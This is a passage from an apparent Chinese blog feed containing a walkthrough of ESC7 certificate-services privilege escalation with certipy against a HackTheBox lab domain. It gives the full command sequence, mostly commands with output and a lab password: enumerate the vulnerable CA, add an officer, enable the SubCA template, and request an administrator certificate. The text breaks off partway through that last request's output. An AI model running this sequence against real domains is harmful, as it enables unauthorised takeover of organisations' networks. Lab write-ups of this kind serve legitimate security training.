<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zlte.netlify.app</id>
    <title>竹林寺 • Posts by &#34;工具&#34; category</title>
    <link href="https://zlte.netlify.app" />
    <updated>2024-01-23T17:20:34.000Z</updated>
    <category term="thinkphp反序列化" />
    <category term="redis缓存" />
    <category term="rce" />
    <category term="xss" />
    <category term="域控提权" />
    <category term="权限维持" />
    <entry>
        <id>https://zlte.netlify.app/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/</id>
        <title>域控提权/域用户证书配置提权/ESC7</title>
        <link rel="alternate" href="https://zlte.netlify.app/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;h2 id=&#34;一使用场景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一使用场景&#34;&gt;#&lt;/a&gt; 一。使用场景：&lt;/h2&gt;
&lt;h3 id=&#34;11需要有证书服务器adcs配置错误的域用户密码或hash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11需要有证书服务器adcs配置错误的域用户密码或hash&#34;&gt;#&lt;/a&gt; 1.1 需要有证书服务器 (ADCS)&amp;amp; 配置错误的域用户密码或 hash&lt;/h3&gt;
&lt;h2 id=&#34;二使用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二使用步骤&#34;&gt;#&lt;/a&gt; 二。使用步骤：&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;(看使用步骤前，建议先看步骤三注意与踩坑)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;21查看域用户配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21查看域用户配置&#34;&gt;#&lt;/a&gt; 2.1. 查看域用户配置&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;拿到域用户的 hash 或密码后，用 &lt;code&gt;certipy&lt;/code&gt;  工具远程读取用户证书配置是否存在配置错误，如果有错误会显示漏洞存在且打出漏洞名称：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy.exe &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;raven@manager.htb&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236 &lt;span class=&#34;token parameter variable&#34;&gt;-vulnerable&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-stdout&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​		&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; certipy.exe &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;raven@manager.htb&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236 &lt;span class=&#34;token parameter variable&#34;&gt;-vulnerable&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-stdout&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Finding certificate templates&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Found &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt; certificate templates&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Finding certificate authorities&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Found &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; certificate authority&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Found &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt; enabled certificate templates&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Trying to get CA configuration &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; via CSRA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Got CA configuration &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Enumeration output:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certificate Authorities&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    CA Name                             &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; manager-DC01-CA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    DNS Name                            &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; dc01.manager.htb&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Certificate Subject                 &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;manager-DC01-CA, &lt;span class=&#34;token assign-left variable&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;manager, &lt;span class=&#34;token assign-left variable&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;htb&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Certificate Serial Number           &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; 5150CE6EC048749448C7390A52F264BB&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Certificate Validity Start          &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2023&lt;/span&gt;-07-27 &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;:21:05+00:00&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Certificate Validity End            &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2122&lt;/span&gt;-07-27 &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;:31:04+00:00&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Web Enrollment                      &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; Disabled&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    User Specified SAN                  &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; Disabled&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Request Disposition                 &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; Issue&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Enforce Encryption &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; Requests     &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; Enabled&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Permissions&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      Owner                             &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Administrators&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      Access Rights&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Enroll                          &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Operator&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Authenticated Users&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Raven&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ManageCertificates              &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Administrators&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Domain Admins&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Enterprise Admins&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ManageCa                        &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Administrators&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Domain Admins&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Enterprise Admins&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                          MANAGER.HTB&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Raven&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Vulnerabilities&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ESC7                              &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;MANAGER.HTB\\Raven&#39;&lt;/span&gt; has dangerous permissions&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certificate Templates                   &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Could not &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; any certificate templates&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;22-拿到对应漏洞esc7进一步远程攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-拿到对应漏洞esc7进一步远程攻击&#34;&gt;#&lt;/a&gt; 2.2 拿到对应漏洞 (ESC7) 进一步远程攻击&lt;/h3&gt;
&lt;h4 id=&#34;221创建证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221创建证书&#34;&gt;#&lt;/a&gt; 2.2.1. 创建证书&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -add-officer raven &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​				&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; .&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -add-officer raven &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Successfully added officer &lt;span class=&#34;token string&#34;&gt;&#39;Raven&#39;&lt;/span&gt; on &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;222启用证书模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222启用证书模板&#34;&gt;#&lt;/a&gt; 2.2.2. 启用证书模板&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -enable-template SubCA &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; .&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;certipy.exe ca &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; -enable-template SubCA &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ly4k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Successfully enabled &lt;span class=&#34;token string&#34;&gt;&#39;SubCA&#39;&lt;/span&gt; on &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;223请求证书但是会被拒绝拒绝后保存私钥和请求id&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223请求证书但是会被拒绝拒绝后保存私钥和请求id&#34;&gt;#&lt;/a&gt; 2.2.3. 请求证书，但是会被拒绝，拒绝后保存私钥和请求 ID&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;certipy.exe req &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-target&lt;/span&gt; manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-template&lt;/span&gt; SubCA &lt;span class=&#34;token parameter variable&#34;&gt;-upn&lt;/span&gt; administrator@manager.htb -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PS D:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;miniconda&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Scripts&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; certipy req &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; raven@manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;R4v3nBe5tD3veloP3r!123&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ca&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;manager-DC01-CA&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-target&lt;/span&gt; manager.htb &lt;span class=&#34;token parameter variable&#34;&gt;-template&lt;/span&gt; SubCA &lt;span class=&#34;token parameter variable&#34;&gt;-upn&lt;/span&gt; administrator@manager.htb -dc-ip &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.11.236&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span 